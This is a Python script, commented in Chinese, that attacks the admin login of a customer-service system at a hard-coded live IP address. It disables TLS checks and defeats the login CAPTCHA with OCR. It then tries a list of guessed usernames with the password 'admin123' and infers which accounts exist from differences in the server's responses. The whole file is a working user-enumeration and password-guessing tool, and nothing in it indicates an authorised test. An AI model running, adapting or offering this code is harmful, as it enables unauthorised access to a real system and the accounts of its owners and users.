#!/usr/bin/env python3
"""找正确用户名 - 500=不存在, 密码错误=存在"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return r.read()

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"HTTP500"

# 常见客服系统用户名
users = ["admin","zhilian","zyadmin","kefu","customer","service","zhiyuan","zhuli",
         "yun","kefuzhongxin","zy","zhangliang","admin123","boss","guanli","root",
         "test","demo","user","zhiyuanzhang","liang","zhongxin","kefu001","zy_kefu",
         "zhiliankefu","kf","zuoyi","kefu01","zhilian01"]
pw = "admin123"

found = []
for u in users:
    for attempt in range(5):
        cap = get_captcha()
        code = ocr.classification(cap)
        if len(code) != 4: continue
        r = login(u, pw, code)
        if "HTTP500" in r:
            # 验证码对但用户不存在
            print(f"[不存在] {u}", flush=True)
            break
        else:
            # 非500 = 用户存在(密码错误或其他)
            print(f"### 存在? {u}: {r[:100]}", flush=True)
            found.append(u)
            break
        time.sleep(0.2)
print("存在的用户:", found)
